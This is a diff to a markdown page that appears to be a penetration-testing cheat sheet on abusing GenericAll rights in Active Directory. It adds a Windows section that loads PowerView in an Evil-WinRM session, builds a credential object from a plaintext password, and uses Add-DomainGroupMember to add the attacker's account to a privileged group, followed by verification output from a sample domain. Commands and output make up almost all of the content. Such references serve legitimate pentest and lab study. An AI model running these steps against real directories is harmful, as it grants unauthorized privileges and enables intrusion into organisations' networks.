@@ -6,7 +6,7 @@ tags: ["Powerview", "Genericall", "AddMember", "Group Policy", "Domain Controlle
 
 ### Privesc #1: Add self to group (From Linux)
 
-{{< tab set1 tab1 active >}}bloodyAD{{< /tab >}}
+{{< tab set1 tab1 >}}bloodyAD{{< /tab >}}
 {{< tab set1 tab2 >}}powerview.py{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
@@ -141,5 +141,68 @@ SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-
 ```
 
 <small>*Ref: [powerview.py](https://github.com/aniqfakhrul/powerview.py)*</small>
+
+{{< /tabcontent >}}
+
+### Privesc #1: Add self to group (From Windows)
+
+{{< tab set2 tab1 >}}Windows{{< /tab >}}
+{{< tabcontent set2 tab1 >}}
+
+#### 1. Import PowerView
+
+```console
+. .\PowerView.ps1
+```
+
+```console {class=sample-code}
+*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
+```
+
+#### 2. Create a cred object (runas) \[optional\]
+
+```console
+$username = '<DOMAIN>\<USER>'
+```
+
+```console
+$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
+```
+
+```console
+$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
+```
+
+#### 3. Add self to group
+
+```console
+Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>' -Credential $Cred
+```
+
+```console {class="sample-code"}
+PS C:\programdata> Add-DomainGroupMember -Identity 'security engineers' -Members 'user' -Credential $Cred
+Add-DomainGroupMember -Identity 'security engineers' -Members 'user' -Credential $Cred
+```
+
+```console
+# Check
+Get-DomainGroupMember -Identity '<GROUP>'
+```
+
+```console {class="sample-code"}
+PS C:\programdata> Get-DomainGroupMember -Identity 'security engineers'
+Get-DomainGroupMember -Identity 'security engineers'
+
+...[SNIP]...
+
+GroupDomain             : corp.local
+GroupName               : Security Engineers
+GroupDistinguishedName  : CN=Security Engineers,CN=Users,DC=corp,DC=local
+MemberDomain            : corp.local
+MemberName              : user
+MemberDistinguishedName : CN=user,OU=Contractors,OU=Corp,DC=corp,DC=local
+MemberObjectClass       : user
+MemberSID               : S-1-5-21-2291914956-3290296217-2402366952-1114
+```
 
 {{< /tabcontent >}}
